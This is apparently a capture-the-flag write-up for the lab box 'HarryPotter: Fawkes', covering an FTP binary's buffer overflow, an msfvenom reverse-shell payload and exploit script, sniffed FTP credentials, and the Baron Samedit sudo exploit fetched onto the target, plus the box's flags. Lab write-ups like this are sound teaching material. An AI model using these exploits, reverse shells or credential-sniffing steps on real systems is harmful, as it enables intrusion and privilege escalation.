# HarryPotter: Fawkes — Writeup

**Series:** HarryPotter (Box 3 of 3)
**Difficulty:** Hard
**Author:** Mansoor R (@time4ster)
**Goal:** Find the last 3 horcruxes and defeat Voldemort

---

## Phase 1 — Enumeration

### Initial Nmap Scan

An initial nmap scan was run to discover the target IP and identify open ports.

<img width="1532" height="744" alt="initialnmapscan" src="https://github.com/user-attachments/assets/93135760-bfc8-49ed-ba96-cbd68ea0fd58" />

The following ports were found open:

- **21** — FTP (anonymous login allowed)
- **80** — HTTP
- **2222** — EtherNetIP-1
- **9898** — MonkeyCom

The target IP was saved to a variable to avoid retyping it throughout the engagement:

```bash
export ip=192.168.56.104
```

### Service and Version Scan

A targeted scan was run against the discovered ports to enumerate services and versions.

<img width="1564" height="707" alt="nmapscan1" src="https://github.com/user-attachments/assets/24873379-881a-418f-bcb7-28439b492ec3" />
<img width="1562" height="765" alt="nmapscan2" src="https://github.com/user-attachments/assets/bb079954-feec-4955-924d-eb7bb2fc5388" />

Several interesting findings:

- **Two SSH ports** are open — port 22 on the host and port 2222 on what appears to be a separate service, suggesting a Docker container may be running inside the host.
- **Port 9898** (MonkeyCom) appears to be a program that takes user input, which warrants further investigation.

---

## Phase 2 — Probing Port 9898

Netcat was used to interact directly with the service on port 9898.

```bash
nc $ip 9898
```

<img width="1535" height="767" alt="netcat" src="https://github.com/user-attachments/assets/75e1017d-575d-45b1-b5c8-f20bef54a231" />

As suspected, the service accepts user input. This raises the possibility of a buffer overflow vulnerability, which will be investigated after further enumeration.

---

## Phase 3 — FTP Anonymous Login

The initial nmap scan revealed that FTP allows anonymous login. This was investigated immediately.

```bash
ftp $ip
# username: anonymous
# password: (blank)
```

<img width="1542" height="394" alt="ftpsignin" src="https://github.com/user-attachments/assets/30bf73b5-4281-4f2e-9728-85a472f07102" />

Login was successful. The directory contained a single file, `server_hogwarts`, which was downloaded.

```bash
get server_hogwarts
```

---

## Phase 4 — Binary Analysis

### Identifying the File

The downloaded file was analysed to determine what it is.

```bash
file server_hogwarts
```

<img width="1486" height="651" alt="getserver" src="https://github.com/user-attachments/assets/d083e1ed-6dc1-4e4e-9f6e-c1127682a468" />
<img width="1553" height="355" alt="file" src="https://github.com/user-attachments/assets/512279fa-aa40-4f9c-8504-f907d4fa2762" />

It is a 32-bit Linux ELF executable.

### Extracting Strings

All human-readable strings embedded in the binary were dumped.

```bash
strings server_hogwarts
```

<img width="309" height="80" alt="stringdump" src="https://github.com/user-attachments/assets/85a1cba4-ddad-4bd5-b553-74e4e30c4600" />
<img width="140" height="84" alt="strcpy" src="https://github.com/user-attachments/assets/664219d1-fe71-497f-96e4-a2514c32f0dd" />

`strcpy` was identified in the output. This confirms the possibility of a buffer overflow attack — `strcpy` copies user input into a buffer without checking the size, meaning oversized input can overwrite adjacent memory.

### Running the Binary

The binary was made executable and run locally.

```bash
chmod +x server_hogwarts
./server_hogwarts
```
<img width="565" height="309" alt="runningfile" src="https://github.com/user-attachments/assets/b43d8b57-6853-48a1-98fa-617c33c9aca4" />

It began listening on port 9898 — confirming it is the same application running on the target. This means the exploit can be developed and tested locally before being used against the target.

---

## Phase 5 — Buffer Overflow Exploitation

### Step 1 — Confirming the Vulnerability

A large input was sent to the running binary to test for a crash.

<img width="1345" height="732" alt="crashconfirmed" src="https://github.com/user-attachments/assets/83f48b7b-ff4e-4385-b1ba-74f8873c6631" />

A segmentation fault was observed, confirming the buffer overflow vulnerability.

### Step 2 — Finding the Offset

Metasploit's pattern tool was used alongside GDB to determine the exact number of bytes needed to reach EIP.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

The generated pattern was sent to the binary running under GDB. The resulting EIP value was passed to `pattern_offset`:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764
```

<img width="1607" height="811" alt="gdbandmetasploit" src="https://github.com/user-attachments/assets/8c3ef932-726d-459d-9433-1e16893d59ca" />

**Offset: 112 bytes**

<img width="765" height="316" alt="offset" src="https://github.com/user-attachments/assets/54ad9867-bd4d-4edb-90d8-3a5f82c09c7a" />

### Step 3 — Confirming EIP Control

112 A's followed by 4 B's were sent to confirm control of EIP.

```bash
python3 -c "print('A' * 112 + 'BBBB')" | nc 127.0.0.1 9898
```

<img width="1642" height="721" alt="eipcontrolconfirmation" src="https://github.com/user-attachments/assets/2cfaf0f4-e6a2-40d9-af85-4cd7e4dc2827" />

GDB reported EIP as `0x42424242` (the hex value of `BBBB`), confirming full control of the instruction pointer.

### Step 4 — Finding a JMP ESP Gadget

A JMP ESP gadget was located inside the binary using `objdump`.

```bash
objdump -d server_hogwarts | grep -i "jmp.*esp"
```

<img width="838" height="328" alt="gadget" src="https://github.com/user-attachments/assets/77ccf987-b199-4883-b02c-ccfcb1c4fa60" />

The gadget was found at address **0x8049d55** (`ff e4` is the machine code for `JMP ESP`). In little-endian byte order this becomes `\x55\x9d\x04\x08`.

### Step 5 — Generating the Shellcode

A reverse shell payload was generated with msfvenom, excluding null bytes which would terminate the string copy prematurely.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -b "\x00" -f python
```

<img width="826" height="632" alt="gneratepayload" src="https://github.com/user-attachments/assets/b18edea8-d24e-4faa-a097-450df2e9754b" />

### Step 6 — Building and Firing the Exploit

The final exploit was assembled and fired against the target after several iterations of testing.

```python
import socket

jmp_esp = b"\x55\x9d\x04\x08"
nop_sled = b"\x90" * 32
buf =  b""
# (shellcode bytes)

payload = b"A" * 112 + jmp_esp + nop_sled + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.104", 9898))
s.send(payload)
s.close()
```

<img width="1121" height="704" alt="newpayload" src="https://github.com/user-attachments/assets/baf55ed6-0a71-4158-b841-0b45dd82fde9" />

A netcat listener was set up before firing:

```bash
nc -lvnp 4444
```

<img width="1849" height="596" alt="fawkeshell" src="https://github.com/user-attachments/assets/eea8e409-f96e-42ab-a401-c9d4076f4040" />

A shell was received. `id` and `whoami` confirmed the session was running as `harry`.

<img width="931" height="385" alt="inasharry" src="https://github.com/user-attachments/assets/1603abd9-cb4c-4ef7-a838-6191d5b05b90" />

---

## Phase 6 — Docker Container Enumeration

The hostname and OS version were checked to confirm the environment.

```bash
hostname
cat /etc/os-release
```
<img width="914" height="385" alt="hostname" src="https://github.com/user-attachments/assets/a5683b3c-d1a4-4fe1-b32c-cf1f8fb9bfde" />

The random hex hostname and Alpine Linux OS confirmed that this shell is inside a Docker container, not the host OS.

---

## Phase 7 — Escaping the Container

### Retrieving Credentials

Harry's home directory contained a `.mycreds.txt` file with credentials.

```bash
cat ~/.mycreds.txt
```

<img width="846" height="325" alt="FounCredentials" src="https://github.com/user-attachments/assets/399f7d44-1d09-4883-890d-0b29795a1521" />

### SSH into the Container

The credentials were used to SSH into the container's SSH service on port 2222.

```bash
ssh harry@192.168.56.104 -p 2222
```

<img width="806" height="602" alt="sshin" src="https://github.com/user-attachments/assets/071d4d33-05f1-4ca6-8e3b-cfd27aef4dad" />

### Escalating to Root Inside the Container

`sudo -l` revealed that harry can run all commands as root with no password.

```bash
sudo -l
```

Since Alpine Linux does not have bash, `ash` was used instead:

```bash
sudo /bin/ash
```

<img width="802" height="306" alt="rootaccess" src="https://github.com/user-attachments/assets/2b4adcf3-f7da-4368-a943-460559ff32aa" />

Root access was obtained inside the container.

### Horcrux 1

```bash
cat /root/horcrux1.txt
```

<img width="817" height="539" alt="firsthorcrux+note" src="https://github.com/user-attachments/assets/f99f13fd-3834-424a-a922-175cb480dfa9" />

**horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}**

### Note

`note.txt` hinted at analysing network traffic to find a user attempting to log into the FTP server.

---

## Phase 8 — Network Traffic Analysis

The available network interfaces were checked.

```bash
ip a
```

<img width="752" height="322" alt="NetworkInterfaces" src="https://github.com/user-attachments/assets/a40bc88d-1a4e-45ad-b461-be7081530c7c" />

The container is on `172.17.0.2`, meaning the host is at `172.17.0.1`. `tcpdump` was used to sniff FTP traffic on `eth0`.

```bash
tcpdump -i eth0 port 21 -A
```

<img width="823" height="319" alt="passwordanduser" src="https://github.com/user-attachments/assets/907baa91-d10b-4a9d-b67b-b73b0ecd256d" />

The capture revealed plaintext FTP credentials being sent repeatedly from the host:

- **User:** `neville`
- **Password:** `bL!Bsg3k`

> FTP transmits credentials in plaintext, making them trivially readable via traffic capture.

---

## Phase 9 — Host Access as Neville

The captured credentials were used to SSH into the real host on port 22.

```bash
ssh neville@192.168.56.104 -p 22
```

<img width="753" height="255" alt="logeedinasneville" src="https://github.com/user-attachments/assets/a655dd7c-651e-4e8d-97a3-1076eab48075" />

### Horcrux 2

The second horcrux was found in neville's home directory.

```bash
cat /home/neville/horcrux2.txt
```

<img width="714" height="146" alt="2ndhorcrux" src="https://github.com/user-attachments/assets/71f43a93-fb48-4927-b26a-183d3a7bf1a4" />

**horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}**

---

## Phase 10 — Privilege Escalation (Baron Samedit CVE-2021-3156)

### Confirming Vulnerability

The sudo version was checked.

```bash
sudo --version
```

**Sudo version 1.8.27** — confirmed vulnerable to Baron Samedit (CVE-2021-3156), which affects all versions below 1.9.5p2. It is a Python script that triggers a heap overflow in sudo to spawn a root shell without requiring a password.

### Transferring the Exploit

Since the target had no internet access, the exploit was downloaded on Kali and served via a Python web server.

On Kali:

```bash
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
python3 -m http.server 8080
```

On Fawkes:

```bash
wget http://192.168.56.101:8080/exploit_nss.py
```

<img width="1843" height="678" alt="exploitdownload" src="https://github.com/user-attachments/assets/6e118f4f-7791-46b4-a336-2929e252fa23" />

### Running the Exploit

The sudo path was corrected in the script to match the target system (`/usr/local/bin/sudo`), then the exploit was run.

```bash
python3 exploit_nss.py
```

<img width="427" height="140" alt="gotin" src="https://github.com/user-attachments/assets/955d6c77-8962-44c4-8b47-1c8d25c5729f" />


Root access was obtained on the host.

### Horcrux 3

```bash
cat /root/horcrux3.txt
```
<img width="787" height="664" alt="finalhorcrux" src="https://github.com/user-attachments/assets/03f29509-6399-4ed4-a9d9-5cbd1df733f0" />

**horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}**

---

## Summary

| Step | Technique |
|------|-----------|
| Enumeration | nmap, FTP anonymous login |
| Binary analysis | `file`, `strings` |
| Initial foothold | 32-bit Linux buffer overflow → reverse shell |
| Container escalation | sudo ash → root in Alpine Docker container |
| Lateral movement | tcpdump FTP credential sniffing → neville |
| Host escalation | Baron Samedit (CVE-2021-3156) → root |

### Horcruxes Found

| # | Horcrux |
|---|---------|
| 6 | `horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}` |
| 7 | `horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}` |
| 8 | `horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}` |
